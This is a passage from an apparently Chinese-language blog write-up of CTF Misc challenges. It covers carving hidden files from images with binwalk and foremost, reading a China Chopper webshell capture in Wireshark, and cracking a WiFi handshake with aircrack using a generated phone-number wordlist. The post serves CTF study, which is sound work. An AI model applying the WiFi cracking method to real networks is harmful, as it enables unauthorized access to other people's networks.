+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为最近要实验班考核，开始做一下Misc题目，毕竟要简单一些。。发现好多神奇在kali里面，就用ssh连接了本地win10和kali，搭了xftp互传文件，后台挂上kali解放双手解放内存，爽的不行~</p>
+<h3 id="又是一张图片，还单纯么"><a href="#又是一张图片，还单纯么" class="headerlink" title="又是一张图片，还单纯么"></a>又是一张图片，还单纯么</h3><p>丢到kali的binwalk里扫一下：</p>
+<pre><code>binwalk -e 2.jpg</code></pre><p>发现有好多文件，用Kali下的foremost分离一下：</p>
+<pre><code>foremost 2.jpg</code></pre><p>分离了两张图片传回到win下查看flag</p>
+<h3 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a>linux基础</h3><p>给了一个flag未知类型的文件，又提示linux基础。<br>学会了一个linux下的打印命令：strings</p>
+<pre><code>strings flag</code></pre><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>得到一个pcap的文件，果断丢到wireshark<br>追踪Tcp数据流发现有Base64编码的东西。<br>解码后发现有这个东西:C:\wwwroot\flag.tar.gz<br>我的想法是，可能这个pcap里还包含的有其它文件，不管了丢到binwalk里看一下<br><img src="https://s1.ax1x.com/2018/06/23/PpvTz9.png" alt="1"><br>果然有一个zip的压缩文件，但是我用foremost分离不出来，于是用binwalk的dd命令来提取：<br><img src="https://s1.ax1x.com/2018/06/23/Ppvbs1.png" alt="2"></p>
+<p>注意偏移量的选取！</p>
+<p>参考：<a href="https://blog.csdn.net/vspiders/article/details/72876889" target="_blank" rel="noopener">CTF中图片隐藏文件分离方法总结</a></p>
+<h3 id="要蹭网先解开密码"><a href="#要蹭网先解开密码" class="headerlink" title="要蹭网先解开密码"></a>要蹭网先解开密码</h3><p>给了一个cap文件，放到kali里的aircrack里跑。<br>给了前七位，用密码工具生成完整的11位手机号码的密码字典。<br>接着执行如下命令：<br><img src="https://s1.ax1x.com/2018/06/23/P9kq9P.png" alt="1"><br>index那行提示是让我们看握手包的次数，显示的是三次就输入3</p>
+<p>后期要做一个破解wifi的文章~</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/06/23/CTF中的Misc题目/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
